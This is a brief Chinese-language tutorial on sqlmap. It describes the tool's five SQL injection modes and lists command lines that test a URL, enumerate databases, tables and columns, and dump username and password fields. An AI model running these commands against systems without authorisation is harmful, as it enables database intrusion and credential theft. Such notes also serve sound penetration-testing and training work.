# Sqlmap
---

数据库注入1、工具注入2、手动注入

Sqlmap是一个自动化的SQL注入利器，其主要功能是扫描、发现并利用给定的URL的SQL注入漏洞，进行数据库注入攻击。

支持如MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB等数据库。

Sqlmap支持五种不同的注入模式： 1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。 2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。 3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。 4、联合查询注入，可以使用union的情况下的注入。 5、堆查询注入，可以同时执行多条语句的执行时的注入。

Sqlmap常用用法【Kali自带】

 1、对url进行检测，判断是否存在SQL注入 sqlmap -u "url" --batch 

2.获取数据库 a、获取全部数据库 sqlmap -u URL --dbs --batch b、获取当前数据库 sqlmap -u URL --current-db --batch 

3、获取当前数据库里所有表 sqlmap -u URL -D (数据库) --tables --batch

4、获取表的字段 python sqlmap.py -u URL -D (数据库) -T users --columns --batch

 5、dump字段内容 sqlmap -u URL -D (数据库) -T users -C "password,username" --dump --batch 如果字段内容多的话可以再加上如 --start 1 --stop 100 这样就取1-100条数据 --dump 可以换成 --dump-all则导出全部的内容
